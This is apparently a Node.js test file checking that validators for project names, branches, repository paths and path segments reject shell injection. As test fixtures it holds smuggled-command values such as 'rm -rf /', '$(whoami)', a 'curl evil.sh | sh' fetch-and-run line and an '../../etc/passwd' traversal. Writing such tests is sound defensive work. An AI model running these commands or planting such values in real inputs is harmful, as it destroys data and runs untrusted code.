const { test } = require('node:test');
const assert = require('node:assert/strict');
const {
    assertSafeProjectName,
    assertSafeRepository,
    assertSafeBranch,
    assertSafePathSegment
} = require('../utils/validate');

test('assertSafeProjectName accepts normal names', () => {
    assert.doesNotThrow(() => assertSafeProjectName('my-app'));
    assert.doesNotThrow(() => assertSafeProjectName('my_app_2'));
    assert.doesNotThrow(() => assertSafeProjectName('a'));
});

test('assertSafeProjectName rejects shell metacharacters', () => {
    assert.throws(() => assertSafeProjectName('app; rm -rf /'));
    assert.throws(() => assertSafeProjectName('$(whoami)'));
    assert.throws(() => assertSafeProjectName('app`id`'));
    assert.throws(() => assertSafeProjectName(''));
});

test('assertSafeBranch accepts branch names with slashes and dots', () => {
    assert.doesNotThrow(() => assertSafeBranch('feature/login-page'));
    assert.doesNotThrow(() => assertSafeBranch('release-1.2.0'));
});

test('assertSafeBranch rejects injection attempts', () => {
    assert.throws(() => assertSafeBranch('main; curl evil.sh | sh'));
    assert.throws(() => assertSafeBranch('main && rm -rf /'));
});

test('assertSafeRepository rejects path traversal / injection', () => {
    assert.throws(() => assertSafeRepository('../../etc/passwd'));
    assert.throws(() => assertSafeRepository('repo\nEvilCommand'));
});

test('assertSafePathSegment rejects shell metacharacters in cloned paths', () => {
    assert.doesNotThrow(() => assertSafePathSegment('/tmp/apk-builds/my-app-123/android'));
    assert.throws(() => assertSafePathSegment('/tmp/apk-builds/my-app"; rm -rf ~ #/android'));
});
